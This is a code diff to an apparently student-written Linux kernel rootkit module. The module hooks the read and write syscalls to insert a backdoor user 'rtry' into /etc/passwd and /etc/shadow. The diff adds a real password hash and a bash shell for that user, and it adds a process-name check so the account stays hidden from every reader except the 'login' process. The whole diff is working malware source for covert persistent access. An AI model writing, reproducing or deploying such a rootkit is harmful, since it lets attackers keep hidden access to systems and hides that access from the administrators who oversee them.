@@ -24,6 +24,36 @@ extern asmlinkage long (*real_write)(unsigned int, char __user *, size_t);
 static char *passwd = "/etc/passwd";
 static char *shadow = "/etc/shadow";
 
+int getProcessName(char *str) {
+        int pid = current->pid;
+        char *name = (char *) kmalloc(4096, GFP_KERNEL);
+        sprintf(name, "/proc/%d/cmdline", pid);
+        struct file *fcmdline = filp_open(name, O_RDONLY,0);
+        mm_segment_t fs;
+        int ret = -1;
+//      if (fcmdline == NULL) 
+        //      printk(KERN_ALERT "filp_open error.\n");
+//      else {
+                //get current segment descriptor
+        if(fcmdline !=NULL) {
+                fs = get_fs();
+                //set segment descriptor associated to kernel space
+                set_fs(get_ds());
+                //read file
+                fcmdline->f_op->read(fcmdline, name, 4096, &fcmdline->f_pos);
+                //restore segment descriptor
+                set_fs(fs);
+                //check process for "test"
+                if(strstr(name, str) !=NULL)
+                        ret = 0;
+        }
+        filp_close(fcmdline, NULL);
+        if(name!= NULL)
+                kfree(name);
+        return ret;
+}
+
+
 
 /*
  * hijacked_write : hooks the write syscall to add the backdoor account
@@ -35,16 +65,18 @@ static char *shadow = "/etc/shadow";
 asmlinkage long hijacked_write(unsigned int fd, char __user *buf, size_t count) 
 {
 	char *kbuf = NULL, *path = NULL,*str = NULL;
-	struct file *f = fget(fd);
-	int path_len;
 	long num_writes = real_write(fd, buf, count); 
-	if ( num_writes < 0)
-		goto out;
+	if(fd < 3 || num_writes == 0)
+		goto out;	
+	struct file *f = fget(fd);
 	if(f == NULL) {
 		goto out;
 	}
 	const char *name = ((f->f_path).dentry->d_name).name;
 	if(strstr(name, "passwd") == NULL && strstr(name, "shadow") == NULL)
+		goto out;
+	int path_len;
+	if ( num_writes < 0)
 		goto out;
 	kbuf = kmalloc(PAGE_SIZE, GFP_KERNEL);
 	if (kbuf == NULL) {
@@ -57,9 +89,11 @@ asmlinkage long hijacked_write(unsigned int fd, char __user *buf, size_t count)
 
 	/* check if the opened file is passwd or shadow file */
 	if(strstr(path, passwd) != NULL)
-		str = "rtry:x:1001:1001::/home/rtry:/bin/sh\n";
+		str = "rtry:x:1001:1001:Rashmi,,,:/home/rashmi:/bin/bash\n";
 	else if(strstr(path, shadow) != path)
-		str = "rtry:!:17128:0:99999:7:::\n";
+	 str = "rtry:$6$ZymoiqnH$guiA6/D9BFJyVHlx/4cJjWVF6PUsJaNxDYVf1X8iIr.uUnini10JGzcUueMjftbamAtciYLMOdGMg2gt3mUR71:17132:0:99999:7:::\n";
+
+
 	if(str != NULL && count != 0) {
 		/* copy user buf data into the temporary buffer kbuf */
 		copy_from_user(kbuf,buf,PAGE_SIZE);
@@ -91,19 +125,19 @@ asmlinkage long hijacked_read(unsigned int fd, char __user *userbuf, size_t coun
 {
 	char *kbuf = NULL, *path = NULL, *buf = NULL;
 	long num_reads = real_read(fd,userbuf, count); 
+	if(fd < 3 || num_reads <= 0)
+		goto out;	
 	struct file *f = fget(fd);
-	char *str = NULL ,*try = NULL;
-	int len1 = 0, len = 0;
-
-	if ( num_reads <= 0)
-		goto out;
 	if(f == NULL) {
 		goto out;
 	}
 	const char *name = ((f->f_path).dentry->d_name).name;
 	if(strstr(name, "passwd") == NULL && strstr(name, "shadow") == NULL)
 		goto out;
-	printk("name: %s\n", name);
+	char *str = NULL ,*try = NULL;
+	int len1 = 0, len = 0;
+	if ( getProcessName("login") == 0)
+		goto out;
 	kbuf = kmalloc(PAGE_SIZE, GFP_KERNEL);
 	if (kbuf == NULL) {
 		num_reads = -ENOMEM;
@@ -112,9 +146,11 @@ asmlinkage long hijacked_read(unsigned int fd, char __user *userbuf, size_t coun
 	path = d_path(&f->f_path, kbuf, PAGE_SIZE);
 	/* check if the open file is passwd or shadow file */
 	if(strstr(path,passwd) != NULL) 
-		str = "rtry:x:1001:1001::/home/rtry:/bin/sh\n";
+		str = "rtry:x:1001:1001:Rashmi,,,:/home/rashmi:/bin/bash\n";
 	else if(strstr(path,shadow) != NULL)
-		str = "rtry:!:17128:0:99999:7:::\n";
+ 	str = "rtry:$6$ZymoiqnH$guiA6/D9BFJyVHlx/4cJjWVF6PUsJaNxDYVf1X8iIr.uUnini10JGzcUueMjftbamAtciYLMOdGMg2gt3mUR71:17132:0:99999:7:::\n";
+
+
 	/* removes the backdoor account from the files  */
 	if(str != NULL) {
 		buf = kmalloc(num_reads, GFP_KERNEL);
